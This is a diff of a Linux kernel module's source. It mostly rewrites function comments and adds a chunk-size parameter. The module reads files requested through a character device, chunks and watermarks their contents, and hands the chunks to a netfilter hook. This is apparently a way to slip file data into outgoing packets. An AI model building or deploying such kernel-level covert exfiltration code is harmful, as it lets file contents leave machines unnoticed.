@@ -20,19 +20,16 @@ unsigned int g_payload_generator_thread_stop = 0;
 
 static const char* payload_generator_thread_name = "kpayload";
 
-/**
- * kmalloc_array - allocate memory for an array.
- * @n: number of elements.
- * @size: element size.
- * @flags: the type of memory to allocate (see kmalloc).
- */
 int read_file_thread_func(void* data);
 
 /**
- * kmalloc_array - allocate memory for an array.
- * @n: number of elements.
- * @size: element size.
- * @flags: the type of memory to allocate (see kmalloc).
+ * safe_read_from_file - wrapping for vfs_read / kernel_read.
+ * @filp: pointer to the file.
+ * @file_data: output buffer to store the file data.
+ * @file_size: size to read.
+ * @current_position: current position of the file. will be changed according to the size read.
+ * 
+ * This function is called safe since it handles the FS in the older vfs_read function.
  */
 ssize_t safe_read_from_file(struct file *filp, char *file_data, size_t file_size, loff_t *current_position)
 {
@@ -62,10 +59,9 @@ ssize_t safe_read_from_file(struct file *filp, char *file_data, size_t file_size
 }
 
 /**
- * kmalloc_array - allocate memory for an array.
- * @n: number of elements.
- * @size: element size.
- * @flags: the type of memory to allocate (see kmalloc).
+ * copy_signature_to_chunk - watermarks chunk with a signature.
+ * @chunk: chunk to watermark.
+ * @size: the size of the file which the chunk belongs to.
  */
 void copy_signature_to_chunk(struct file_chunk *chunk, size_t file_size)
 {
@@ -79,11 +75,12 @@ void copy_signature_to_chunk(struct file_chunk *chunk, size_t file_size)
 }
 
 /**
- * kmalloc_array - allocate memory for an array.
- * @n: number of elements.
- * @size: element size.
- * @flags: the type of memory to allocate (see kmalloc).
- * @note: no need to use locks as no one accesses the modifiers list in runtime.
+ * run_data_modifiers_on_file - runs all existing modifiers on the file's data.
+ * @data: file's data.
+ * @len: file's size.
+ * 
+ * Modifiers will change the data content, and may to change the file size.
+ * Fine by us since as long as they change the len variable.     
  */
 int run_data_modifiers_on_file(char *data, ssize_t *len)
 { 
@@ -104,12 +101,11 @@ int run_data_modifiers_on_file(char *data, ssize_t *len)
 }
 
 /**
- * kmalloc_array - allocate memory for an array.
- * @n: number of elements.
- * @size: element size.
- * @flags: the type of memory to allocate (see kmalloc).
+ * read_file_chunks - reads a file and splits it to chunks.
+ * @file_path: path to the file.
+ * @chunk_size: size of each chunk. may contain less if there is not enough data left in the file.
  */
-void read_file_chunks(const char* file_path)
+void read_file_chunks(const char* file_path, size_t chunk_size)
 {
     // Open the file from user-space.
     struct file *filp;
@@ -127,18 +123,18 @@ void read_file_chunks(const char* file_path)
         goto close_filp;
     }
 
-    // 1. allocate data with size same as file_size, with vmalloc.
+    if (0 == file_size) {
+        // nothing for us to look here.
+        goto close_filp;
+    }
+
     char *file_data = (char*)vmalloc(file_size);
     if (NULL == file_data) {
         goto close_filp;
     }
 
-    // Read the file's content.
-    //ssize_t size_read = size_to_read;
-    //current_position += size_to_read;
+    // Read the file's content and run the modifiers (if exist) on its data.
     ssize_t size_read = safe_read_from_file(filp, file_data, file_size, &current_position);
-
-    // 3. run any modifiers on the file data
     run_data_modifiers_on_file(file_data, (ssize_t *)&file_size);
 
     // Split the file data to chunks
@@ -150,7 +146,7 @@ void read_file_chunks(const char* file_path)
             goto free_vmalloc;
         }
 
-        new_chunk->data = (char *)kmalloc(get_default_payload_size(), GFP_ATOMIC);
+        new_chunk->data = (char *)kmalloc(chunk_size, GFP_ATOMIC);
         if (NULL == new_chunk->data) {
             kfree(new_chunk);
             goto free_vmalloc;
@@ -187,10 +183,7 @@ close_filp:
 }
 
 /**
- * kmalloc_array - allocate memory for an array.
- * @n: number of elements.
- * @size: element size.
- * @flags: the type of memory to allocate (see kmalloc).
+ * process_next_pending_file - receives the next file from the character device and reads it.
  */
 void process_next_pending_file(void)
 {    
@@ -233,7 +226,7 @@ void process_next_pending_file(void)
 
     // TODO: support saving only X chunks (for dealing with large files)
     // No need to acquire chunks_list_mutex as read_file_chunks does that internally.
-    read_file_chunks(file_path);
+    read_file_chunks(file_path, get_default_payload_size());
 
     return;
 
@@ -241,6 +234,14 @@ release_mutex:
     mutex_unlock(&g_requestd_files_list_mutex);
 }
 
+/**
+ * generate_payload - get the next chunk.
+ * @buffer: output variable to store the chunk's data.
+ * @length: output variable to store the chunk's data length.
+ * 
+ * This function is called by the netfilter hook, HENCE RUNS IN INTERRUPT CONTEXT!
+ * All rules of interrupt context also applied here - avoid sleeping, blocking, or accessing user-space.
+ */
 int generate_payload(char *buffer, size_t *length)
 {
     if (NULL == buffer) {
@@ -277,6 +278,10 @@ error_and_spinlock_release:
     return 0;
 }
 
+/**
+ * read_file_thread_func - run periodaically and reads the files pending to be set.
+ * @data: unused, passed by kthread_run.
+ */
 int read_file_thread_func(void* data)
 {
     while (!g_payload_generator_thread_stop) {
@@ -289,6 +294,9 @@ int read_file_thread_func(void* data)
     return 0;
 }
 
+/**
+ * start_payload_generator_thread - starts the payload generator thread.
+ */
 int start_payload_generator_thread(void)
 {
     g_get_payload_func = &generate_payload;
@@ -302,6 +310,9 @@ int start_payload_generator_thread(void)
     return 0;
 }
 
+/**
+ * stop_payload_generator_thread - stops the payload generator thread.
+ */
 void stop_payload_generator_thread(void)
 {
     g_payload_generator_thread_stop = 1;
@@ -309,6 +320,10 @@ void stop_payload_generator_thread(void)
     put_task_struct(g_payload_generator_thread);  
 }
 
+/**
+ * payload_generator_add_modifier - adds a modifier to the modifiers list.
+ * @func: modifier function to add.
+ */
 int payload_generator_add_modifier(data_modifier_func func)
 {
     struct data_modifier *modifier = (struct data_modifier *)kmalloc(sizeof(struct data_modifier), GFP_KERNEL);
@@ -324,6 +339,10 @@ int payload_generator_add_modifier(data_modifier_func func)
     mutex_unlock(&g_data_modifiers_list_mutex);
 }
 
+/**
+ * payload_generator_remove_modifier - remove a modifier from the modifiers list.
+ * @func: modifier function to remove.
+ */
 void payload_generator_remove_modifier(data_modifier_func func)
 {
     struct list_head *pos = NULL;
@@ -348,6 +367,10 @@ void payload_generator_remove_modifier(data_modifier_func func)
     mutex_unlock(&g_data_modifiers_list_mutex);
 }
 
+/**
+ * get_default_payload_size - returns the chunk size.
+ * @func: modifier function to add.
+ */
 size_t get_default_payload_size(void)
 {
     // TODO: check if less then the size of struct signature
